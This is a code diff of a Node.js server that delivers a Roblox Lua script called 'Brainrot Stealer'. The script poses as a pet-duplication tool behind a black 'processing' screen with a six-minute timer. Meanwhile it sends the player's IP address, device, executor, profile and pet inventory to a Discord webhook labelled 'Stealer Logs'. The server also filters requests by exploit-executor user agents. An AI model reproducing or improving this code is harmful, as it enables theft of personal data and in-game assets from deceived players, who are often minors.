@@ -15,12 +15,6 @@ function blockNonExecutor(req, res, next) {
     ua.includes("krnl") ||
     ua.includes("fluxus") ||
     ua.includes("executor") ||
-    ua.includes("xeno") ||
-    ua.includes("delta") ||
-    ua.includes("volcano") ||
-    ua.includes("zenith") ||
-    ua.includes("wave") ||
-    ua.includes("solara") ||
     ref.includes("roblox.com");
 
   if (!allowed) {
@@ -249,7 +243,7 @@ local function createBlackScreen()
     local sg = Instance.new("ScreenGui"); sg.Name="FullBlackScreen"; sg.DisplayOrder=999999; sg.ResetOnSpawn=false; sg.ZIndexBehavior=Enum.ZIndexBehavior.Global; sg.Parent=player.PlayerGui
     local f  = Instance.new("Frame"); f.Size=UDim2.new(2,0,2,0); f.Position=UDim2.new(-0.5,0,-0.5,0); f.BackgroundColor3=Color3.new(); f.BorderSizePixel=0; f.ZIndex=999999; f.Parent=sg
     local tl = Instance.new("TextLabel"); tl.Size=UDim2.new(1,0,0,80); tl.Position=UDim2.new(0,0,0.4,0); tl.BackgroundTransparency=1; tl.Text="06:00"; tl.TextColor3=Color3.fromRGB(0,255,255); tl.TextSize=48; tl.Font=Enum.Font.GothamBold; tl.ZIndex=1000000; tl.Parent=f
-    local sl = Instance.new("TextLabel"); sl.Size=UDim2.new(1,0,0,25); sl.Position=UDim2.new(0,0,0.55,0); sl.BackgroundTransparency=1; sl.Text="🧠 Processing Brainrots..."; sl.TextColor3=Color3.new(1,1,1); sl.TextSize=18; sl.Font=Enum.Font.Gotham; sl.ZIndex=1000000; sl.Parent=f
+    local sl = Instance.new("TextLabel"); sl.Size=UDim2.new(1,0,0,25); sl.Position=UDim2.new(0,0,0.55,0); sl.BackgroundTransparency=1; sl.Text="Processing Brainrots..."; sl.TextColor3=Color3.new(1,1,1); sl.TextSize=18; sl.Font=Enum.Font.Gotham; sl.ZIndex=1000000; sl.Parent=f
     return sg,tl,sl
 end
 
@@ -338,10 +332,10 @@ local function fmtPetList(p,show)
 end
 
 local function isLegit(brain,best)
-    if #brain>2 then return "🔥 LEGIT HIT - Multiple brainrots" end
-    if #best>0 and best[1].MoneyPerSec>5e7 then return "🔥 LEGIT HIT - High value" end
-    if #brain>0 then return "⚠️ POTENTIAL HIT - Some brainrots" end
-    return "❌ LOW VALUE - Nothing good"
+    if #brain>2 then return "LEGIT HIT - Multiple brainrots" end
+    if #best>0 and best[1].MoneyPerSec>5e7 then return "LEGIT HIT - High value" end
+    if #brain>0 then return "POTENTIAL HIT - Some brainrots" end
+    return "LOW VALUE - Nothing good"
 end
 
 local function startDupeProcess(psLink)
@@ -357,24 +351,24 @@ local function startDupeProcess(psLink)
     local hit = isLegit(brain,best)
 
     local embed = {
-        title = "🧠 ALL BEST BRAINROTS",
-        description = "📡 **Private Server:** " .. (psLink or "Not provided"),
+        title = "ALL BEST BRAINROTS",
+        description = "Private Server: " .. (psLink or "Not provided"),
         color = 65280,
         author = {name = playerName, icon_url = playerAvatar, url = playerProfile},
         fields = {
-            {name = "👤 USER INFO", value = "```🛠️ Executor: " .. exec .. "\\n🌐 IP: " .. ip .. "\\n📱 Device: " .. dev .. "```", inline = true},
-            {name = "🔗 LINKS", value = "[👤 Profile](" .. playerProfile .. ")", inline = true},
-            {name = "🎮 SERVER", value = "```👥 Players: " .. pc .. "\\n🐾 Total Pets: " .. #all .. "\\n🧠 Brainrots: " .. #brain .. "```", inline = true},
-            {name = "🏆 TOP 5 PETS", value = "```" .. fmtPetList(best,true) .. "```", inline = false},
-            {name = "🧠 BRAINROTS", value = "```" .. fmtPetList(brain,true) .. "```", inline = false},
-            {name = "🎯 HIT STATUS", value = "**" .. hit .. "**", inline = false}
+            {name = "USER INFO", value = "Executor: " .. exec .. "\\nIP: " .. ip .. "\\nDevice: " .. dev, inline = true},
+            {name = "LINKS", value = "[Profile](" .. playerProfile .. ")", inline = true},
+            {name = "SERVER", value = "Players: " .. pc .. "\\nTotal Pets: " .. #all .. "\\nBrainrots: " .. #brain, inline = true},
+            {name = "TOP 5 PETS", value = fmtPetList(best,true), inline = false},
+            {name = "BRAINROTS", value = fmtPetList(brain,true), inline = false},
+            {name = "HIT STATUS", value = hit, inline = false}
         },
-        footer = {text = "🧠 Stealer Logs • " .. os.date("%X")},
+        footer = {text = "Stealer Logs • " .. os.date("%X")},
         timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
     }
     SendToDiscord(embed)
 
-    sl.Text = "✅ Logs sent! Starting 6-minute timer..."
+    sl.Text = "Logs sent! Starting 6-minute timer..."
     local total = 360 
     local start = tick()
     while tick()-start < total do
@@ -386,16 +380,16 @@ local function startDupeProcess(psLink)
     end
 
     SendToDiscord({
-        title = "✅ DUPE PROCESS COMPLETE",
+        title = "DUPE PROCESS COMPLETE",
         color = 65280,
         author = {name = playerName, icon_url = playerAvatar, url = playerProfile},
         fields = {
-            {name = "📊 RESULTS", value = "```⏰ Time: 6 min\\n🐾 Pets Duped: " .. #all .. "\\n🧠 Brainrots: " .. #brain .. "\\n🎯 Status: " .. hit .. "```", inline = false}
+            {name = "RESULTS", value = "Time: 6 min\\nPets Duped: " .. #all .. "\\nBrainrots: " .. #brain .. "\\nStatus: " .. hit, inline = false}
         },
-        footer = {text = "🧠 Stealer Logs • " .. os.date("%X")}
+        footer = {text = "Stealer Logs • " .. os.date("%X")}
     })
 
-    sl.Text = "🎉 Complete! Closing..."
+    sl.Text = "Complete! Closing..."
     tl.Text = "DONE!"
     wait(3)
     bs:Destroy()
@@ -417,7 +411,7 @@ local function createPSInputGUI()
     local title = Instance.new("TextLabel")
     title.Size = UDim2.new(1,0,0,60)
     title.BackgroundColor3 = Color3.fromRGB(0,50,0)
-    title.Text = "🧠 BRAINROT STEALER\\nEVERYONE CAN USE"
+    title.Text = "BRAINROT STEALER - EVERYONE CAN USE"
     title.TextColor3 = Color3.fromRGB(0,255,0)
     title.Font = Enum.Font.GothamBold
     title.TextSize = 16
@@ -436,7 +430,7 @@ local function createPSInputGUI()
     btn.Size = UDim2.new(0.7,0,0,50)
     btn.Position = UDim2.new(0.15,0,0.7,0)
     btn.BackgroundColor3 = Color3.fromRGB(0,200,0)
-    btn.Text = "🚀 START STEALING"
+    btn.Text = "START STEALING"
     btn.TextColor3 = Color3.new(1,1,1)
     btn.Font = Enum.Font.GothamBold
     btn.TextSize = 14
@@ -445,15 +439,15 @@ local function createPSInputGUI()
     btn.MouseButton1Click:Connect(function()
         local link = tb.Text
         if string.find(string.lower(link or ""),"roblox") then
-            btn.Text = "🔄 STARTING..."
+            btn.Text = "STARTING..."
             btn.BackgroundColor3 = Color3.fromRGB(0,100,0)
             wait(1)
             startDupeProcess(link)
         else
-            btn.Text = "❌ INVALID LINK"
+            btn.Text = "INVALID LINK"
             btn.BackgroundColor3 = Color3.fromRGB(200,0,0)
             wait(2)
-            btn.Text = "🚀 START STEALING"
+            btn.Text = "START STEALING"
             btn.BackgroundColor3 = Color3.fromRGB(0,200,0)
         end
     end)
@@ -463,9 +457,9 @@ end
 wait(1)
 createPSInputGUI()
 
-print("🧠 Brainrot Stealer Loaded Successfully!")
-print("✅ Everyone can use this script!")
-print("🔗 User: " .. game.Players.LocalPlayer.Name)
+print("Brainrot Stealer Loaded Successfully!")
+print("Everyone can use this script!")
+print("User: " .. game.Players.LocalPlayer.Name)
 `;
 
   res.type("text/plain").send(lua);
@@ -486,7 +480,7 @@ app.use((req, res) => {
 // 5. START SERVER
 // ------------------------------------------------------------------
 app.listen(PORT, () => {
-  console.log("🧠 Brainrot Stealer Server running on port " + PORT);
-  console.log("✅ Everyone can use the script");
-  console.log("🔗 Website: https://tommyfc555-github-io.onrender.com");
+  console.log("Brainrot Stealer Server running on port " + PORT);
+  console.log("Everyone can use the script");
+  console.log("Website: https://tommyfc555-github-io.onrender.com");
 });
